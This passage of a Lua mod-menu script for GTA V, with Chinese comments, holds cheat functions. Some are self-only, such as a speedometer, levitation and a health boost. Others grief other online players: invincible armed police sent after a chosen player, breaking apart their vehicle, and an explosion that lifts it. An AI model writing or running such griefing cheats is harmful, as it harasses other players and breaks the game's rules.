    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
    PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)            
    TASK.TASK_COMBAT_PED(ped, p_ped, 0, 16)
    PED.SET_PED_INTO_VEHICLE(ped, truck, -1)
    TASK.SET_TASK_VEHICLE_CHASE_BEHAVIOR_FLAG(ped, 1, true)
    TASK.SET_TASK_VEHICLE_CHASE_IDEAL_PURSUIT_DISTANCE(ped, 10.0)
    TASK.TASK_VEHICLE_CHASE(ped, p_ped)
    firefighter_thread(ped, p_ped, truck)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(truck, true)
end






----派遣警车
function spawn_police_car(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targetPed = PLAYER.GET_PLAYER_PED(pid)
    local offset = get_random_offset_from_entity(targetPed, 50.0, 60.0)
    local outCoords = v3.new()
    local outHeading = memory.alloc(4)
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local vehicleHash <const> = util.joaat("police3")
        local pedHash <const> = util.joaat("s_m_y_cop_01")
        request_model(vehicleHash); request_model(pedHash)

        local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
        local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
        if not ENTITY.DOES_ENTITY_EXIST(vehicle) then return end
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
        AUDIO.BLIP_SIREN(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)

        local pSequence = memory.alloc_int()
        TASK.OPEN_SEQUENCE_TASK(pSequence)
        TASK.TASK_COMBAT_PED(0, targetPed, 0, 16)
        TASK.TASK_GO_TO_ENTITY(0, targetPed, 6000, 10.0, 3.0, 0.0, 0)
        TASK.SET_SEQUENCE_TO_REPEAT(memory.read_int(pSequence), true)
        TASK.CLOSE_SEQUENCE_TASK(memory.read_int(pSequence))

        for seat = -1, 0 do
            local cop = entities.create_ped(5, pedHash, outCoords, 0.0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(cop, true, false)
            DECORATOR.DECOR_SET_INT(cop, "Casino_Game_Info_Decorator", 1 << 2)
            PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
            PED.SET_PED_RANDOM_COMPONENT_VARIATION(cop, 0)
            local weapon = (seat == -1) and "weapon_pistol" or "weapon_pumpshotgun"
            WEAPON.GIVE_WEAPON_TO_PED(cop, util.joaat(weapon), -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 1, true)
            PED.SET_PED_AS_COP(cop, true)
            ENTITY.SET_ENTITY_INVINCIBLE(cop, true)
            TASK.TASK_PERFORM_SEQUENCE(cop, memory.read_int(pSequence))
        end

        TASK.CLEAR_SEQUENCE_TASK(pSequence)
        AUDIO.PLAY_POLICE_REPORT("SCRIPTED_SCANNER_REPORT_FRANLIN_0_KIDNAP", 0.0)
    end
end

----移除车门
function remove_doors(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    request_control(vehicle, 3)
    local doors = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(vehicle)
    for i= 0, doors do
        VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
    end
end
----分离载具零件
function detach_vehicle_parts(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    request_control(vehicle, 3)
    --移除车门
    local doors = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(vehicle)
    for i= 0, doors do
        VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
    end
    --移除引擎盖,后备箱前、后
    for i= 4, 6 do
        VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
    end
    --分离车辆挡风玻璃
    VEHICLE.POP_OUT_VEHICLE_WINDSCREEN(vehicle)
    --破坏窗户
    for i = 0, 7 do
        VEHICLE.SMASH_VEHICLE_WINDOW(vehicle, i)
    end

    --分离车辆轮胎
    for i = 0, 5 do 
        entities.detach_wheel(entities.handle_to_pointer(vehicle), i)
    end
end


----猴王
function monkey_king()
    local monkey = 0xA8683715 --猴子
    local monkeyKING = 0xC2D06F53 --猴王
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, -2, 0)
    change_model(PLAYER.PLAYER_ID(), monkeyKING)
    for i = 1, 5 do
        local ped = create_ped(28, monkey, pos.x, pos.y, pos.z, 72)
        join_group(ped)
    end
end


----彩弹枪
function Paintball_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local entity = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity) then
            local primary, secundary = random_colour(), random_colour()
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
        end
    end
end


----速度表
local gears = {} --挡位图标
for i= 0, 7 do 
    gears[i] = directx.create_texture(filesystem.resources_dir() .. '\\SakuraScript\\speedometer\\' .. '/gear_' .. tostring(i) .. '.png')
end
local speed_nums = {} --速度值图标
for i= 0, 9 do 
    speed_nums[i] = directx.create_texture(filesystem.resources_dir() .. '\\SakuraScript\\speedometer\\' .. '/mph_' .. tostring(i) .. '.png')
end
local gauge_bg = directx.create_texture(filesystem.resources_dir() .. '\\SakuraScript\\speedometer\\' .. '/dial.png')--主体图标
local needle = directx.create_texture(filesystem.resources_dir() .. '\\SakuraScript\\speedometer\\' .. '/needle.png')--指针图标
local kph_label = directx.create_texture(filesystem.resources_dir() .. '\\SakuraScript\\speedometer\\' .. '/kph_label.png') --单位

local carposX = 0.84
local carposY = 0.75
function speedometer_X(x)
    carposX = x / 100
end
function speedometer_Y(y)
    carposY = y / 100
end
function speedometer()
    local car_ptr = entities.get_user_vehicle_as_pointer(false)
    local car = entities.pointer_to_handle(car_ptr)
    if car_ptr ~= 0 then
        local rpm = entities.get_rpm(car_ptr)--每分钟转数
        local max_rotation = math.rad(0.501 * 180) -- 针可以达到的最大旋转角度（弧度）

        ----根据汽车的速度和最大速度计算打捆针的旋转
        local needle_rotation = (rpm / 1)/1.485  - 0.170
        local gear = entities.get_current_gear(car_ptr)
        directx.draw_texture(gauge_bg, 0.08, 0.08, 0.5, 0.5, carposX, carposY - 0.004, 0, 1, 1, 1, 1) --主图标
        directx.draw_texture(needle, 0.08, 0.08, 0.5, 0.5, carposX, carposY, needle_rotation, 1.0, 1.0, 1.0, 1)
        if gear < 8 then--gtav 载具默认最高挡位7,但第三方辅助可以修改其值,即造成got nil
            directx.draw_texture(gears[gear], 0.08, 0.08, 0.5, 0.5, carposX - 0.0001, carposY - 0.005, 0, 1, 1, 1, 1)
        else
            directx.draw_texture(gears[7], 0.08, 0.08, 0.5, 0.5, carposX - 0.0001, carposY - 0.005, 0, 1, 1, 1, 1)
        end

        ----速度
        local speed = math.ceil(ENTITY.GET_ENTITY_SPEED(car) * 3.6)
        local speed_str = tostring(speed)
        local cur_speed_num_offset = 0
        for i=1, #speed_str do
            directx.draw_texture(speed_nums[tonumber(speed_str:sub(i,i))] , 0.06, 0.06, 0.5, 0.5, (carposX) + cur_speed_num_offset - 0.005, carposY + 0.1, 0, 1.0, 1.0, 1.0, 1)
            cur_speed_num_offset = cur_speed_num_offset + 0.06 / 2
        end

        --速度单位
        cur_speed_num_offset = cur_speed_num_offset + 0.011
        directx.draw_texture(kph_label, 0.06, 0.06, 0.5, 0.5, (carposX) + cur_speed_num_offset - 0.005, carposY + 0.13, 0, 1.0, 1.0, 1.0, 1)
    end
end


----锁定玩家
function lock_player(toggled)
    locked_player = toggled
    while locked_player do
        for _, pid in players.list(false, true, true) do
            PLAYER.ADD_PLAYER_TARGETABLE_ENTITY(PLAYER.PLAYER_ID(), PLAYER.GET_PLAYER_PED(pid))
            ENTITY.SET_ENTITY_IS_TARGET_PRIORITY(PLAYER.GET_PLAYER_PED(pid), false, 400.0)    
        end
        util.yield()
    end
    for _, pid in players.list(false, true, true) do
        PLAYER.REMOVE_PLAYER_TARGETABLE_ENTITY(PLAYER.PLAYER_ID(), PLAYER.GET_PLAYER_PED(pid))
    end
end

----导弹雷达
function Missile_radar()
    for k, obj in pairs(entities.get_all_objects_as_handles()) do
        if is_entity_a_projectile(ENTITY.GET_ENTITY_MODEL(obj)) then
            if HUD.GET_BLIP_FROM_ENTITY(obj) == 0 then
                local proj_blip = HUD.ADD_BLIP_FOR_ENTITY(obj)
                HUD.SET_BLIP_SPRITE(proj_blip, 443)
                HUD.SET_BLIP_COLOUR(proj_blip, 75)
            end
        end
    end
end
----载具识别
function Vehicle_identify()
    local contact = directx.create_texture(filesystem.scripts_dir() .. '\\daidaiScript\\' .. '\\flightredux\\'.. 'contact.png')
    for k,veh in pairs(entities.get_all_vehicles_as_handles()) do
        local mdl = ENTITY.GET_ENTITY_MODEL(veh)
        if ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            local c = ENTITY.GET_ENTITY_COORDS(veh)
            local draw_pos = world_to_screen_coords(c.x, c.y, c.z)
            directx.draw_texture(contact, 0.005, 0.005, 0.5, 0.5, draw_pos.x, draw_pos.y, 0, 0, 1, 0, 1)
        end
    end
end


----召回载具
function recall_vehicle()
    local lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
    if lastcar ~= 0 then
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 5.0, 0.0)
        local pedhash = -67533719
        request_model(pedhash)
        local tesla_ped = entities.create_ped(32, pedhash, coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        ENTITY.SET_ENTITY_VISIBLE(tesla_ped, false, false)--不可见NPC
        local tesla_blip = HUD.ADD_BLIP_FOR_ENTITY(lastcar)
        HUD.SET_BLIP_COLOUR(tesla_blip, 7)
        PED.SET_PED_INTO_VEHICLE(tesla_ped, lastcar, -1)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ped, lastcar, coords['x'], coords['y'], coords['z'], 15.0, 786996, 5)
        while tesla_ped do
            if PED.IS_PED_GETTING_INTO_A_VEHICLE(PLAYER.PLAYER_PED_ID()) then
                local veh = PED.GET_VEHICLE_PED_IS_ENTERING(PLAYER.PLAYER_PED_ID())
                if veh == lastcar then
                    delete_entity(tesla_ped)
                    util.remove_blip(tesla_blip) 
                    break
                end
            end
            util.yield()
        end
    end
end


----读取外观
function read_appearance()
    local path = filesystem.scripts_dir() .. 'daidaiScript/Outfits/A-test.txt'

    local data = fileread(path, 'r', '*all')
    if data ~= "" then
        filewrite(path, "w+", "")
    end

    for i = 0, 11 do
        local index = PED.GET_PED_DRAWABLE_VARIATION(PLAYER.PLAYER_PED_ID(), i)--drawableId
        local texture = PED.GET_PED_TEXTURE_VARIATION(PLAYER.PLAYER_PED_ID(), i)--textureId

        local kk = "DRAWABLE "..i..": "..index..","..texture.."\n"
        filewrite(path, "a+", kk)
    end

    for i = 0, 9 do
        local index = PED.GET_PED_PROP_INDEX(PLAYER.PLAYER_PED_ID(), i)--drawableId
        local texture = PED.GET_PED_PROP_TEXTURE_INDEX(PLAYER.PLAYER_PED_ID(), i)--textureId

        local kk = "PROPS "..i..": "..index..","..texture.."\n"
        filewrite(path, "a+", kk)
    end
    util.toast("读写完成")
end


----空中行走
function walk_on_air(on)
    walkonair = on
    if walkonair then
        while walkonair do
            --显示按键
            display_buttons({{0, 38, '向上'},{1, 44, '向下'}})

            --清除火焰(生成的实体被炮击可能存在火焰)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            FIRE.STOP_FIRE_IN_RANGE(pos.x, pos.y, pos.z, 500)
            FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID()) 

            if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
                if air_block == 0 or not ENTITY.DOES_ENTITY_EXIST(air_block) then
                    local hash = 1352775717
                    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
                    airb_ht = c['z']-1.4
                    air_block = create_object(hash, c['x'], c['y'], airb_ht)
                    ENTITY.SET_ENTITY_INVINCIBLE(air_block,true)
                    ENTITY.SET_ENTITY_ALPHA(air_block, 0)
                    ENTITY.SET_ENTITY_VISIBLE(air_block, false, 0)
                end
                pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
                local box_pos = ENTITY.GET_ENTITY_COORDS(air_block, false)
                if Get_distance(pos, box_pos, true) > 1.4 then
                    ENTITY.SET_ENTITY_COORDS(air_block, pos.x, pos.y, pos.z-1.4, false, false, false)
                    ENTITY.SET_ENTITY_HEADING(air_block, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                end
                if PAD.IS_CONTROL_PRESSED(0, 38) then--E
                    airb_ht = airb_ht + 0.1
                    ENTITY.SET_ENTITY_COORDS(air_block, pos.x, pos.y, airb_ht, false, false, false)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, airb_ht + 1.5, true, false, false)
                    ENTITY.SET_ENTITY_HEADING(air_block, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                end
                if PAD.IS_CONTROL_PRESSED(0, 44) then--Q
                    airb_ht = airb_ht - 0.1
                    ENTITY.SET_ENTITY_COORDS(air_block, pos.x, pos.y, airb_ht, false, false, false)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, airb_ht + 1.5, true, false, false)
                    ENTITY.SET_ENTITY_HEADING(air_block, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                end
            end
            util.yield()
        end
    else
        delete_entity(air_block)
    end
end

----悬浮模式
function levitate_mode(toggled)
    movement_toggle = toggled
    local target_ent
    while movement_toggle do
        disable_control_action(36, 21, 22, 30, 31)
        display_buttons({{0, 22, '加速'},{1, 36, '下降'},{2, 21, '上升'}})

        --恢复形态，防止坠落\跳伞动作
        if PED.IS_PED_FALLING(PLAYER.PLAYER_PED_ID()) or 
        PED.GET_PED_PARACHUTE_STATE(PLAYER.PLAYER_PED_ID()) == 0 or 
        PED.GET_PED_PARACHUTE_STATE(PLAYER.PLAYER_PED_ID()) == 1 or 
        PED.GET_PED_PARACHUTE_STATE(PLAYER.PLAYER_PED_ID()) == 2 then
            TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
            TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
        end

        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
            target_ent = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        else
            if ENTITY.GET_ENTITY_TYPE(target_ent) == 2 then
                ENTITY.FREEZE_ENTITY_POSITION(target_ent, false)
                ENTITY.APPLY_FORCE_TO_ENTITY(target_ent, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, true, true)
            end
            target_ent = PLAYER.PLAYER_PED_ID()
        end

        local rot = CAM.GET_GAMEPLAY_CAM_ROT(5)--控制视野
        local speed = PAD.IS_DISABLED_CONTROL_PRESSED(0,22) and 3 or 1
        ENTITY.FREEZE_ENTITY_POSITION(target_ent, true)
        

        if PAD.IS_CONTROL_PRESSED(0,32) then--前进
            local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ent, 0, speed, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end
        if PAD.IS_CONTROL_PRESSED(0,33) then--后退
            local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ent, 0, -speed, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end
        if PAD.IS_CONTROL_PRESSED(0,34) then--左
            local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ent, -speed, 0, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end
        if PAD.IS_CONTROL_PRESSED(0,35) then--右
            local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ent, speed, 0, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end
        if PAD.IS_DISABLED_CONTROL_PRESSED(0,21) then--上
            local pos = ENTITY.GET_ENTITY_COORDS(target_ent)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z + speed, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end
        if PAD.IS_DISABLED_CONTROL_PRESSED(0,36) then--下
            local pos = ENTITY.GET_ENTITY_COORDS(target_ent)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(target_ent, pos.x, pos.y, pos.z - speed, true, false, false)
            ENTITY.SET_ENTITY_ROTATION(target_ent, 0, 0, rot.z, 5, true)
        end

        util.yield()
    end
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.FREEZE_ENTITY_POSITION(target_ent, false)
    ENTITY.APPLY_FORCE_TO_ENTITY(target_ent, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, true, true)
end

----导航到最近的加油站
function GetClosestGasStation()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
	local coord
	local distance
	for _, v in ipairs(GAS_STATION_COORDS) do
		local dist = Get_distance(v, pos, true)
		if not distance or (distance and distance > dist) then
			distance = dist
			coord = v
		end
        util.yield()
	end
	HUD.SET_NEW_WAYPOINT(coord.x, coord.y)
end


----世界轰炸
function World_Bombing()
    local allveh = entities.get_all_vehicles_as_handles()
	local allpeds = entities.get_all_peds_as_handles()
	local allobj = entities.get_all_objects_as_handles()
	util.yield(100)
	local vel, velo = {}, {}
	velo.x = 0.0
	velo.y = 0.0
	velo.z = 1000.00
    local myveh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), false)
	for i = 1, #allpeds do
		if not PED.IS_PED_A_PLAYER(allpeds[i]) then
			vel.x = math.random(1000.0, 10000.0)
			vel.y = math.random(1000.0, 10000.0)
			vel.z = math.random(1000.0, 7500.0)
			ENTITY.FREEZE_ENTITY_POSITION(allpeds[i], false)
            ENTITY.APPLY_FORCE_TO_ENTITY(allpeds[i], 5, 100.0, 100.0, 100.0, 100.0, 100.0, 100.0, 0, 1, 1, 1, 0, 1)
			ENTITY.SET_ENTITY_VELOCITY(allpeds[i], vel.x, vel.y, vel.z)
		end
	end
	for y = 1, #allveh do
		if allveh[y] ~= myveh then
			vel.x = math.random(1000.0, 10000.0)
			vel.y = math.random(1000.0, 10000.0)
			vel.z = math.random(1000.0, 7500.0)
			ENTITY.FREEZE_ENTITY_POSITION(allveh[y], false)
			VEHICLE.SET_VEHICLE_GRAVITY(allveh[y], false)
			ENTITY.SET_ENTITY_VELOCITY(allveh[y], velo.x, velo.y, velo.z)
			util.yield(25)
			ENTITY.SET_ENTITY_VELOCITY(allveh[y], vel.x, vel.y, vel.z)
		end
	end
	for x = 1, #allobj do
		vel.x = math.random(1000.0, 10000.0)
		vel.y = math.random(1000.0, 10000.0)
		vel.z = math.random(1000.0, 7500.0)
		ENTITY.FREEZE_ENTITY_POSITION(allobj[x], false)
		ENTITY.SET_ENTITY_VELOCITY(allobj[x], vel.x, vel.y, vel.z)
	end
end

----驾驶购物车
function drive_shopping_cart()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local veh = create_vehicle(1353120668, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.SET_ENTITY_ALPHA(veh, 0, false)
    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
    VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)

    local obj_hash = util.joaat("prop_rub_trolley02a")
    local obj = create_object(obj_hash, pos.x, pos.y, pos.z)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true, 0)
end


--冲浪
function surf()
    if not is_entity_on_water(PLAYER.PLAYER_PED_ID()) then
        notification("~y~~bold~不在水上:)", HudColour.blue)
        return
    end
    local veh_hash = -311022263 --载具
    local surfboard_hash = 59140280 --冲浪板
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    request_models(veh_hash,surfboard_hash)
    local ped = PED.CLONE_PED(PLAYER.PLAYER_PED_ID(), true, false, true)
    local veh =  VEHICLE.CREATE_VEHICLE(veh_hash, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()), true, true, false)
    local surfboard = OBJECT.CREATE_OBJECT(surfboard_hash, pos.x, pos.y, pos.z, true, false, true)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(surfboard, veh, 0, 0, 0, 0, 270, 0, 0, true, false, false, true, 0, true, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, surfboard, 0, 0, -1, 0, 90, -90, 0, true, false, false, true, 0, true, 0)
    
    ENTITY.SET_ENTITY_INVINCIBLE(veh,true)
    ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 0, false)
    while ped do

        request_anim_dict("move_strafe@first_person@drunk")
        TASK.TASK_PLAY_ANIM(ped, "move_strafe@first_person@drunk", "idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)

        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), false)
        if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) and ENTITY.DOES_ENTITY_EXIST(veh) and ENTITY.DOES_ENTITY_EXIST(surfboard) then--下车删除
            delete_entity(veh, ped, surfboard)
            return
        elseif car ~= veh and ENTITY.DOES_ENTITY_EXIST(veh) and ENTITY.DOES_ENTITY_EXIST(surfboard) then--换车删除
            delete_entity(veh, ped, surfboard)
            return
        end

        util.yield()
    end
end

----最大生命值
local moddedHealth = 328
function max_health_loop()
    PED.SET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth)
    ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth, 0)
    local health = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
    local strg = "~b~ HEALTH ~w~ "..health
    draw_string(strg, 0.03, 0.05, 0.6, 4)
end
function set_max_health(value)
    moddedHealth = value
end


----光线投影绘制
function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x,
            cam_pos.y,
            cam_pos.z,
            destination.x,
            destination.y,
            destination.z,
            flag,
            -1,
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end


----获取模型尺寸
function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    local min = memory.read_vector3(minptr)
    local max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])
    return size
end

----删除物体
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            delete_entity(object)
        end
    end
end

----UFO引力
function UFO_gravitation(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local coords = players.get_position(pid)
    coords.z = coords.z + 63
    local ufoModel = MISC.GET_HASH_KEY("p_spinning_anus_s")
    local ufo = entities.create_object(ufoModel, coords)
    local player = PLAYER.GET_PLAYER_PED(pid)
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)

    if PED.IS_PED_IN_VEHICLE(player, vehicle, false) then
        request_control(vehicle, 3)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        VEHICLE.BRING_VEHICLE_TO_HALT(vehicle, 0.0, 1, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 83, 100.0, false, true, 0.0)
        util.yield(1000)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, false, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
        util.yield(6000)
        delete_entity(ufo)
    else
        delete_entity(ufo)
        util.toast("目标不在车辆中") 
    end
end

----防崩视角
function anti_crash_cam(toggled)
    if toggled then
        if not CAM.DOES_CAM_EXIST(antiCrashCam) then
            antiCrashCam = CAM.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", -10000, -10000, 3000, 0, 0, 90, 70, true, 1)
        end
        CAM.RENDER_SCRIPT_CAMS(true, true, 1, false, false, false)
        CAM.SET_CAM_ACTIVE(antiCrashCam, true)
        PLAYER.SET_PLAYER_CONTROL(PLAYER.PLAYER_ID(), false, 0)
    else
        CAM.SET_CAM_ACTIVE(antiCrashCam, false)
        CAM.RENDER_SCRIPT_CAMS(false, true, 10, false, false, false)
        CAM.DESTROY_CAM(antiCrashCam, false)
        PLAYER.SET_PLAYER_CONTROL(PLAYER.PLAYER_ID(), true, 0)
    end
end

----禁止镜头抖动
function block_cam_shake()
    if CAM.IS_GAMEPLAY_CAM_SHAKING() then
        CAM.SHAKE_GAMEPLAY_CAM("CLUB_DANCE_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("DAMPED_HAND_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("DEATH_FAIL_IN_EFFECT_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("DRONE_BOOST_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("FAMILY5_DRUG_TRIP_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("gameplay_explosion_shake", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("GRENADE_EXPLOSION_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("GUNRUNNING_BUMP_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("GUNRUNNING_ENGINE_START_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("GUNRUNNING_ENGINE_STOP_SHAKE", 0.0)
        CAM.SHAKE_GAMEPLAY_CAM("GUNRUNNING_LOOP_SHAKE", 0.0)
